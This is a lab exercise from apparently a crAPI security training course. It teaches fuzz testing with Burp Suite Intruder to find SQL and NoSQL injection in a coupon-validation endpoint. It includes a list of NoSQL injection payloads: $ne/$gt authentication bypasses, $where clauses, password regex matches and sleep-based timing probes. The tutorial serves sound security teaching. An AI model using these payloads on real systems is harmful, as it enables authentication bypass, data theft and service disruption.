# crAPI Fuzzing input 
The purpose of these exercise is to introduce the concept of _Fuzz testing_.
Fuzz testing is a technique where input data that is either invalid, unexpected or random
is used as input for an application. The fuzz test is automated by software, which provide
a fast way of inputting a lot of different data.
  
There are 2 overall approaches to fuzz data: Random generated data (dynamic combinations of characters, numbers and so on), and
using premade wordlists. The latter is  by far the fastest approach, and the most suitable for fuzz testing web applications and alike.
  
In previous exercises you have already encountered and used fuzz testing. The dictionary attack you used for basic authentication is
fuzz test approach, using data from a wordlist. The approach for API enumeration also depended on fuzzing the URL path.    
A similar approach can be used for discovering potential vulnerabilities in a web application, by fuzzing the body of a request. 
In these  exercises we will use this approach to discover potentiel SQL Injection vulnerabilities.


## prerequisites
Prior to starting this exercise you should have completed [Exercise 6 - basic authentication attacks](6_Basic_Token_Attacks.md),
to ensure you have experience with fuzzing tools (E.g. Burp suite intruder).

## Discovering possible SQL injection vulnerability with fuzzing
In this exercise you will attempt to discover (not abuse) a SQL (or NoSQL) vulnerability using fuzzing.
crAPI have the option of redeeming discount coupons, let try and see if we can abuse that endpoint.
  
1. In Burp suite, Capture at request for coupon validation
2. Send the request to intruder
3. Set the payload to be the value of _coupon_ .
4. Use the wordlist Generic-SQLI from seclists as payload
5. Observe to responses, what are the baseline lengths and response codes?, which should be ignored?
The general pattern to be observed here, is which content length should be ignored, and which response
code with this content length should be ignored. 
  
If there is no hits, maybe they are not using a SQL database. Let try with some NoSql queries also.
  
It is important to note With the NOsql injection attack, Encapsulating " " should be omitted from the request payload value,
because NoSql Injection is more like an arbitary code injection attack, than a string manipulation attack (Such as SQL Inject).
In short, it is not a string you are injecting.
  
1. Create a small wordlist for noSQL, with the values below:
```
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
|| 1==1//
|| 1==1%00
}, { password : /.*/ }
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
';sleep(5000);
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
{"$ne": null}

```
2. Set the payload to the created wordlist file (clear the payload before adding the new file, or else this will take a while)
3. Execute and observe, which create status codes not similar to the baseline?

You should discover at least 1 potential vulnerability. But we will not attempt to abuse this yet.




